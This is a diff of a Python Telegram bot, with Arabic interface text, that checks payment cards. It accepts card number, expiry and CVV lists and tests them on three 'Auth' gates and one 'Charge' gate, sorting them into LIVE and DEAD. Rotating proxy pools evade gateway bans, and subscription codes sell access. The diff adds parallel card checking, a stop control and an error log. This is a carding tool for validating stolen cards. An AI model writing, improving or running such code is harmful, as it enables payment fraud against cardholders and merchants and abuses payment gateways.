+• 5-10: آمن (Railway مجاني)
+• 10-15: متوسط
+• 15-20: عالي (VPS)
+• 20+: خطر الحظر
+
+⚠️ **تحذير:** الأرقام العالية قد تسبب حظر من البوابات
+
+اختر العدد المناسب:"""
+    
+    bot.send_message(user_id, msg, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == 'admin_back_menu')
+def admin_back_menu(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "غير مصرح لك.")
+        return
+    bot.answer_callback_query(call.id)
+    show_admin_menu(call.from_user.id)
 
 @bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) in ['awaiting_proxies', 'awaiting_proxies_fast'])
 def handle_admin_proxies(message):
-    """استقبال البروكسيات من الأدمن"""
     user_id = message.from_user.id
     if user_id != ADMIN_ID:
         admin_session.pop(user_id, None)
         return
     
     check = admin_session[user_id] == 'awaiting_proxies'
-    
     proxies = []
     
-    # إذا كان ملف
     if message.content_type == 'document':
         try:
             file_info = bot.get_file(message.document.file_id)
@@ -973,23 +1219,20 @@ def handle_admin_proxies(message):
             admin_session[user_id] = 'authenticated'
             show_admin_menu(user_id)
             return
-    # إذا كان نص
     elif message.text:
         proxies = [p.strip() for p in message.text.splitlines() if p.strip() and ':' in p and not p.startswith('/')]
     
     if not proxies:
-        bot.reply_to(message, "❌ لم يتم العثور على بروكسيات صالحة.\nالصيغة: `ip:port`", parse_mode="Markdown")
+        bot.reply_to(message, "❌ لم يتم العثور على بروكسيات صالحة.")
         admin_session[user_id] = 'authenticated'
         show_admin_menu(user_id)
         return
     
-    # بدء الفحص أو الإضافة
     if check:
-        bot.reply_to(message, f"🔍 جاري فحص {len(proxies)} بروكسي...\n⏳ قد يستغرق بعض الوقت")
+        bot.reply_to(message, f"🔍 جاري فحص {len(proxies)} بروكسي...")
     else:
         bot.reply_to(message, f"⚡ جاري إضافة {len(proxies)} بروكسي مباشرة...")
     
-    # الفحص/الإضافة في thread منفصل
     threading.Thread(
         target=add_proxies_to_pool_with_report, 
         args=(proxies, user_id, check),
@@ -1033,7 +1276,6 @@ def revoke_code_input(message):
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
-    
     markup = types.InlineKeyboardMarkup(row_width=1)
     
     if user_id == ADMIN_ID:
@@ -1054,7 +1296,7 @@ def start(message):
             markup.add(
                 types.InlineKeyboardButton("🎫 تفعيل اشتراك", callback_data="redeem_code")
             )
-            bot.reply_to(message, "⛔ ليس لديك اشتراك.\n\nاضغط الزر لتفعيل اشتراكك:", reply_markup=markup)
+            bot.reply_to(message, "⛔ ليس لديك اشتراك.", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'admin_panel')
 def admin_panel_callback(call):
@@ -1090,6 +1332,18 @@ def status(message):
     active, banned, dead = proxy_pool.get_stats()
     bot.reply_to(message, f"📊 **حالة البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")
 
+@bot.message_handler(commands=['logs'])
+def logs_command(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    if not error_log:
+        bot.reply_to(message, "📭 لا توجد أخطاء مسجلة")
+        return
+    msg = "📜 **آخر الأخطاء:**\n\n"
+    for entry in error_log[-20:]:
+        msg += f"`{entry}`\n\n"
+    bot.reply_to(message, msg, parse_mode="Markdown")
+
 @bot.message_handler(commands=['redeem'])
 def redeem(message):
     user_id = message.from_user.id
@@ -1104,7 +1358,6 @@ def redeem(message):
     success, msg = redeem_code(user_id, code)
     bot.reply_to(message, msg)
 
-# ================= Callback Handlers =================
 @bot.callback_query_handler(func=lambda call: call.data.startswith('check_'))
 def select_check_type(call):
     user_id = call.from_user.id
@@ -1118,8 +1371,7 @@ def select_check_type(call):
     if check_type == 'auth':
         msg = "✅ تم اختيار **فحص Auth**\n\n"
         msg += "📊 النظام:\n"
-        msg += "• 3 بوابات\n"
-        msg += "• فحص متتابع\n"
+        msg += "• 3 بوابات (فحص متوازي ⚡)\n"
         msg += "• التصنيف: SUPER LIVE / LIVE / MAYBE LIVE / DEAD\n\n"
         msg += "🎯 اختر البوابة:"
         
@@ -1147,19 +1399,55 @@ def select_gate(call):
     gate_id = call.data.split('_')[1]
     if gate_id == 'auto':
         user_gate_choice[user_id] = 'auto'
-        msg = "✅ تم اختيار **الفحص التلقائي على 3 بوابات**\n\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
+        msg = "✅ تم اختيار **الفحص التلقائي على 3 بوابات**\n\nأرسل البطاقات الآن"
     else:
         user_gate_choice[user_id] = gate_id
-        msg = f"✅ تم اختيار {AUTH_GATES[gate_id]['name']}\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
+        msg = f"✅ تم اختيار {AUTH_GATES[gate_id]['name']}\nأرسل البطاقات الآن"
     
     bot.edit_message_text(msg, call.message.chat.id, call.message.message_id)
 
-# ================= Document Handler =================
+@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
+def stop_check(call):
+    user_id = call.from_user.id
+    with active_checks_lock:
+        if user_id in active_checks:
+            active_checks[user_id]['stop_flag'] = True
+            bot.answer_callback_query(call.id, "⛔ جاري إيقاف الفحص...")
+        else:
+            bot.answer_callback_query(call.id, "⚠️ لا يوجد فحص نشط")
+
+@bot.callback_query_handler(func=lambda call: call.data == 'main_menu')
+def main_menu(call):
+    user_id = call.from_user.id
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    
+    if user_id == ADMIN_ID:
+        markup.add(
+            types.InlineKeyboardButton("🛡️ فحص Auth", callback_data="check_auth"),
+            types.InlineKeyboardButton("💰 فحص Charge", callback_data="check_charge"),
+            types.InlineKeyboardButton("🔐 لوحة الإدارة", callback_data="admin_panel")
+        )
+    else:
+        if is_subscription_active(user_id):
+            markup.add(
+                types.InlineKeyboardButton("🛡️ فحص Auth", callback_data="check_auth"),
+                types.InlineKeyboardButton("💰 فحص Charge", callback_data="check_charge")
+            )
+        else:
+            markup.add(
+                types.InlineKeyboardButton("🎫 تفعيل اشتراك", callback_data="redeem_code")
+            )
+    
+    try:
+        bot.edit_message_text("🏠 **القائمة الرئيسية**\n\nاختر:", call.message.chat.id, 
+                             call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+    except:
+        bot.send_message(user_id, "🏠 **القائمة الرئيسية**\n\nاختر:", reply_markup=markup, parse_mode="Markdown")
+
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
     user_id = message.from_user.id
     
-    # إذا كان الأدمن في وضع انتظار البروكسيات
     if admin_session.get(user_id) in ['awaiting_proxies', 'awaiting_proxies_fast']:
         handle_admin_proxies(message)
         return
@@ -1181,15 +1469,13 @@ def handle_docs(message):
             bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
     else:
         check_type = user_check_type.get(user_id, 'auth')
-        sent_msg = bot.reply_to(message, f"⏳ جاري الفحص...")
-        threading.Thread(target=check_cards, args=(content, message.chat.id, sent_msg.message_id, check_type)).start()
+        bot.reply_to(message, f"⏳ جاري الفحص...")
+        threading.Thread(target=check_cards, args=(content, message.chat.id, user_id, check_type), daemon=True).start()
 
-# ================= الـ Handler العام =================
 @bot.message_handler(func=lambda m: True)
 def handle_text(message):
     user_id = message.from_user.id
     
-    # إذا كان الأدمن في وضع انتظار البروكسيات
     if admin_session.get(user_id) in ['awaiting_proxies', 'awaiting_proxies_fast']:
         handle_admin_proxies(message)
         return
@@ -1215,22 +1501,21 @@ def handle_text(message):
                 types.InlineKeyboardButton("🛡️ فحص Auth", callback_data="check_auth"),
                 types.InlineKeyboardButton("💰 فحص Charge", callback_data="check_charge")
             )
-            bot.reply_to(message, "❌ لم تختر نوع الفحص بعد.\n\nاختر نوع الفحص:", reply_markup=markup)
+            bot.reply_to(message, "❌ لم تختر نوع الفحص بعد.", reply_markup=markup)
             return
         
-        sent_msg = bot.reply_to(message, f"⏳ جاري الفحص...")
-        threading.Thread(target=check_cards, args=(text, message.chat.id, sent_msg.message_id, check_type)).start()
+        bot.reply_to(message, f"⏳ جاري الفحص...")
+        threading.Thread(target=check_cards, args=(text, message.chat.id, user_id, check_type), daemon=True).start()
     else:
         bot.reply_to(message, "❌ أرسل بطاقات (رقم|شهر|سنة|cvv) أو بروكسيات (ip:port)")
 
 # ================= تشغيل البوت =================
 print("✅ البوت شغال مع:")
-print("  • فحص Auth متعدد البوابات (3 بوابات)")
-print("  • فحص Charge (1 بوابة)")
-print("  • نظام اشتراكات ولوحة إدارة")
-print("  • إضافة بروكسيات يدوية (مع/بدون فحص)")
-print("  • تصدير البروكسيات النشطة")
-print("  • حذف تلقائي للبروكسيات الفاشلة")
+print(f"  • فحص Auth متوازي (3 بوابات)")
+print(f"  • فحص Charge (1 بوابة)")
+print(f"  • عدد threads للبطاقات: {CARD_WORKERS}")
+print(f"  • عدد threads للبروكسيات: {PROXY_WORKERS}")
+print(f"  • بانر: {'✅' if os.path.exists(BANNER_PATH) else '❌'}")
 print(f"📁 قاعدة البيانات: {DB_PATH}")
 print("🔥 التوقيع: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆")
 bot.infinity_polling()
